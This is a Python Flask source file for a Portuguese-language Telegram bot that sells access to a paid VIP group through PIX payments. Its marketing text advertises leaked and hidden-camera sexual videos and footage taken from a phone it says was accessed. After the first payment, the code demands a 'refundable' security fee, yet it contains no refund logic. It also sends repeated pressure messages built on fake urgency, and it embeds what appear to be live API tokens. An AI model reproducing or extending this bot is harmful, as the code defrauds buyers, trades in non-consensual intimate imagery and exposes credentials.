import os
import requests
import threading
import time
from flask import Flask, request
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)
scheduler = BackgroundScheduler()
scheduler.start()

# --- AS NOSSAS CHAVES ---
TELEGRAM_BOT_TOKEN = "9144271229:AAFvv9taDmGTnlI4nHoQ4mAOTJqsJFCOxb4"
PUSHINPAY_API_TOKEN = "73774|DCDTM4JGmuvz4MS4g5vPHy2ucM54PkCeQEu7QA4y49fe526b"
ADMIN_ID = "7008304182"
VIP_GROUP_ID = "-1001921257744"

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
PUSHINPAY_API_URL = "https://api.pushinpay.com.br/api/v1"
RENDER_URL_FIXA = "bot-acessovip-1.onrender.com"

usuarios = {}

# ==================== MÍDIAS DO FUNIL ====================
VIDEO_1_NARRADO = "AAMCAQADGQEAAwtq9mYTKIw9CTCi1dG0NNxustTfVwAC6xgAAg_-sEdSJ8QNpaFZRAEAB20AAz0E"
VIDEO_2_LONGO = "AAMCAQADGQEAAwxq9mYTrkycKxZLXqvEFuJMWkzRFAAC7BgAAg_-sEflfXjDBTgZHQEAB20AAz0E"
VIDEO_3_PROMESSA = "AAMCAQADGQEAAw1q9mYTxBErxeiP9uboKRY8gwmCPgAC7RgAAg_-sEct-_T4gH_2WgEAB20AAz0E"
FOTO_OFERTA_NINFA = "AgACAgEAAxkBAAMQavZszfbH4j9T9kElws2YrZIo6S0AAgoNaxsP_rBHs0O4L5Gs34wBAAMCAANzAAM9BA"
IMAGEM_TAXA_SEGURANCA = "AgACAgEAAxkBAAMRavZuBLMuYaDGOSHUpHPh7j9wKPoAAgsNaxsP_rBH1CMV70aesl8BAAMCAANzAAM9BA"
IMAGEM_TUTORIAL_PIX = "AgACAgEAAxkBAAMRavZuBLMuYaDGOSHUpHPh7j9wKPoAAgsNaxsP_rBH1CMV70aesl8BAAMCAANzAAM9BA"
# =========================================================

TEXTO_START = (
    "🔥 **O MAIOR E MAIS PROIBIDO ACERVO DO BRASIL**\n\n"
    "🔞 **OFERTA ÚNICA: O DRIVE DA NINFOMANÍACA DE 19 ANOS**\n\n"
    "Conseguimos acesso ao celular de uma modelo novinha que gravou mais de **400 vídeos amadores** dando para desconhecidos no sigilo. Sem censura, sem cortes, chorando e implorando.\n\n"
    "Além do VIP padrão (com casadas, vazados e câmeras escondidas), você pode levar o acesso VITALÍCIO a essa pasta secreta por um valor ridículo.\n\n"
    "👇 **ESCOLHA O SEU PACOTE ANTES QUE O LINK EXPIRE:**"
)

TEXTO_TAXA_SEGURANCA = (
    "⚠️ **ÚLTIMA ETAPA OBRIGATÓRIA - DISPOSITIVO NÃO RECONHECIDO!**\n\n"
    "Pagamento de entrada confirmado! Porém, nosso sistema antifraude barrou sua entrada imediata. Para manter o grupo 100% livre de denúncias, exigimos uma ativação de segurança.\n\n"
    "🔄 **O valor de R$ 12,90 é 100% REEMBOLSADO** na sua conta PIX no mesmo instante em que você entrar no grupo.\n\n"
    "👇 **Ative abaixo para receber o link IMEDIATAMENTE:**"
)

TEXTO_INSTRUCOES_PIX = (
    "✅ **Como pagar e liberar na hora:**\n\n"
    "1️⃣ - Toque no código abaixo para copiar\n"
    "2️⃣ - Abra o app do seu banco\n"
    "3️⃣ - Escolha **PIX Copia e Cola** e finalize.\n\n"
    "⬇️ **COPIE SEU CÓDIGO ABAIXO** ⬇️"
)

def enviar_mensagem(chat_id, texto, markup=None):
    payload = {"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}
    if markup: payload["reply_markup"] = markup
    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)

def enviar_video(chat_id, video_id, legenda=None, markup=None):
    payload = {"chat_id": chat_id, "video": video_id, "parse_mode": "Markdown"}
    if legenda: payload["caption"] = legenda
    if markup: payload["reply_markup"] = markup
    requests.post(f"{TELEGRAM_API_URL}/sendVideo", json=payload)

def enviar_foto(chat_id, foto_id, legenda=None, markup=None):
    payload = {"chat_id": chat_id, "photo": foto_id, "parse_mode": "Markdown"}
    if legenda: payload["caption"] = legenda
    if markup: payload["reply_markup"] = markup
    requests.post(f"{TELEGRAM_API_URL}/sendPhoto", json=payload)

def gerar_pix_pushinpay(valor_em_reais, chat_id):
    headers = {
        "Authorization": f"Bearer {PUSHINPAY_API_TOKEN}",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    
    valor_centavos = int(float(valor_em_reais) * 100)
    webhook_dinamico = f"https://{RENDER_URL_FIXA}/webhook/pushinpay"
    
    payload = {
        "value": valor_centavos, 
        "webhook_url": webhook_dinamico,
        "external_reference": str(chat_id)
    }
    
    try:
        req = requests.post(f"{PUSHINPAY_API_URL}/pix/cashIn", json=payload, headers=headers, timeout=15)
        
        # Se for sucesso (200 ou 201), devolve o Pix
        if req.status_code in [200, 201]:
            resposta_json = req.json()
            return resposta_json.get("qr_code") or resposta_json.get("pix_copia_e_cola") or resposta_json.get("encodedImage")
        else:
            # SE DEU ERRO, vai devolver a mensagem exata do banco!
            return f"ERRO_BANCO: Código {req.status_code} - Resposta: {req.text}"
    except Exception as e:
        return f"ERRO_SISTEMA: {str(e)}"

def disparar_remarketing(chat_id, tipo_funil, contagem):
    status_atual = usuarios.get(chat_id, {}).get("status")
    
    if tipo_funil == "ENTRADA" and status_atual != "AGUARDANDO_PAGAMENTO_ENTRADA": return
    if tipo_funil == "TAXA" and status_atual != "PENDENTE_TAXA_SEGURANCA": return

    if tipo_funil == "ENTRADA":
        markup = {"inline_keyboard": [[{"text": "🔥 Tentar Novamente - VIP (R$ 9,90)", "callback_data": "comprar_990"}]]}
        if contagem > 3:
            markup = {"inline_keyboard": [[{"text": "💣 Oferta Secreta (R$ 4,90)", "callback_data": "pagar_taxa_490"}]]}
    else:
        markup = {"inline_keyboard": [[{"text": "🔒 Pagar Taxa Reembolsável (R$ 12,90)", "callback_data": "pagar_taxa_1290"}]]}
        if contagem > 3:
            markup = {"inline_keyboard": [[{"text": "🔒 Taxa com Desconto (R$ 4,90)", "callback_data": "pagar_taxa_490"}]]}

    # Aqui também aplicamos o conceito de Thread para envios seguros sem timeout
    def envio_remarketing():
        if contagem == 0 or (contagem > 0 and contagem % 6 == 0):
            legenda = "🚨 **SEU ACESSO ESTÁ SENDO CANCELADO...**\n\nVocê vai mesmo perder isso? Câmeras escondidas, casadas no sigilo e conteúdos deletados da internet que você não acha em lugar nenhum. Finalize agora!"
            enviar_video(chat_id, VIDEO_3_PROMESSA, legenda, markup)
        elif contagem % 2 != 0:
            legenda = "🔥 **MAIS DE 10.000 VAZADOS REAIS...**\n\nO grupo inteiro já está assistindo e assim que esgotar, fechamos. Conteúdos brutais que ninguém tem coragem de postar. Você tem poucos minutos!"
            enviar_video(chat_id, VIDEO_1_NARRADO, legenda, markup)
        else:
            legenda = "👀 **VEJA COMO ESSE VÍDEO TERMINOU LÁ NO VIP...**\n\nO final é assustador. Libere o seu acesso agora mesmo, sem enrolação. Aperte o botão e entre!"
            enviar_video(chat_id, VIDEO_2_LONGO, legenda, markup)

    threading.Thread(target=envio_remarketing).start()

    if contagem == 0: tempo = timedelta(minutes=5)
    elif contagem == 1: tempo = timedelta(minutes=5)
    elif contagem == 2: tempo = timedelta(minutes=10)
    elif contagem == 3: tempo = timedelta(minutes=25)
    else: tempo = timedelta(hours=3)

    scheduler.add_job(disparar_remarketing, 'date', run_date=datetime.now() + tempo, args=[chat_id, tipo_funil, contagem + 1])

@app.route("/", methods=["GET"])
def home(): 
    return "Máquina de Vendas Ativa!", 200

@app.route("/setup", methods=["GET"])
def setup_webhook():
    webhook_url = f"https://{RENDER_URL_FIXA}/webhook/telegram/{TELEGRAM_BOT_TOKEN}"
    resposta = requests.get(f"{TELEGRAM_API_URL}/setWebhook?url={webhook_url}")
    return f"Status do Webhook do Telegram: {resposta.json()}", 200

@app.route("/webhook/pushinpay", methods=["POST", "GET"])
def pushinpay_webhook():
    dados = request.get_json(silent=True)
    if not dados: 
        return {"status": "Teste recebido com sucesso!"}, 200

    status = dados.get("status")
    chat_id = dados.get("external_reference")

    if status in ["paid", "APPROVED", "PAID"] and chat_id:
        chat_id = int(chat_id)
        usuario_status = usuarios.get(chat_id, {}).get("status")

        if usuario_status == "AGUARDANDO_PAGAMENTO_ENTRADA":
            usuarios[chat_id] = {"status": "PENDENTE_TAXA_SEGURANCA"}
            enviar_foto(chat_id, IMAGEM_TAXA_SEGURANCA, TEXTO_TAXA_SEGURANCA, {
                "inline_keyboard": [[{"text": "🔒 Ativar e Reembolsar (R$ 12,90)", "callback_data": "pagar_taxa_1290"}]]
            })
            scheduler.add_job(disparar_remarketing, 'date', run_date=datetime.now() + timedelta(minutes=5), args=[chat_id, "TAXA", 0])

        elif usuario_status == "PENDENTE_TAXA_SEGURANCA":
            usuarios[chat_id] = {"status": "VIP_LIBERADO"}
            try:
                res_convite = requests.post(f"{TELEGRAM_API_URL}/createChatInviteLink", json={"chat_id": VIP_GROUP_ID, "member_limit": 1}).json()
                link = res_convite.get("result", {}).get("invite_link", "LINK_MANUAL_AQUI")
            except: link = "LINK_MANUAL_AQUI"
            
            enviar_mensagem(chat_id, f"🎉 **ACESSO VALIDADO!**\n\nBem-vindo ao submundo. Entre agora:\n👑 [ACESSAR VIP AQUI]({link})")

    return {"status": "ok"}, 200

@app.route(f"/webhook/telegram/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json(silent=True)
    if not update: return {"status": "ok"}, 200
    
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        texto = update["message"].get("text", "")

        if texto.startswith("/start"):
            usuarios[chat_id] = {"status": "AGUARDANDO_PAGAMENTO_ENTRADA"}
            
            # SOLUÇÃO DOS VÍDEOS: Envios em background para não travar o Telegram
            def enviar_sequencia_boas_vindas():
                enviar_video(chat_id, VIDEO_1_NARRADO)
                time.sleep(1) # Intervalo seguro
                enviar_video(chat_id, VIDEO_2_LONGO, "😈 Uma pequena amostra do que te espera...")
                time.sleep(1) # Intervalo seguro
                
                markup = {
                    "inline_keyboard": [
                        [{"text": "✅ VIP + Drive Ninfa (R$ 14,89)", "callback_data": "comprar_1489"}],
                        [{"text": "❌ Apenas o VIP Padrão (R$ 9,90)", "callback_data": "comprar_990"}]
                    ]
                }
                enviar_foto(chat_id, FOTO_OFERTA_NINFA, TEXTO_START, markup)
            
            threading.Thread(target=enviar_sequencia_boas_vindas).start()
            
            scheduler.add_job(disparar_remarketing, 'date', run_date=datetime.now() + timedelta(minutes=5), args=[chat_id, "ENTRADA", 0])

    elif "callback_query" in update:
        query = update["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        botao = query["data"]

        valores = {"comprar_1489": "14.89", "comprar_990": "9.90", "pagar_taxa_1290": "12.90", "pagar_taxa_490": "4.90"}

        if botao in valores:
            enviar_mensagem(chat_id, "⏳ *Gerando sua chave criptografada, aguarde...*")
            
            # Aqui executamos a função do banco
            codigo_pix = gerar_pix_pushinpay(valores[botao], chat_id)
            
            if codigo_pix and not codigo_pix.startswith("ERRO_"):
                enviar_foto(chat_id, IMAGEM_TUTORIAL_PIX)
                enviar_mensagem(chat_id, TEXTO_INSTRUCOES_PIX)
                enviar_mensagem(chat_id, f"`{codigo_pix}`")
            else:
                # SOLUÇÃO DO BANCO: O bot vai enviar no chat exatamente o que a Pushin Pay recusou!
                mensagem_erro = f"❌ *Erro do Banco:* O servidor respondeu com:\n`{codigo_pix}`"
                enviar_mensagem(chat_id, mensagem_erro)

    return {"status": "ok"}, 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
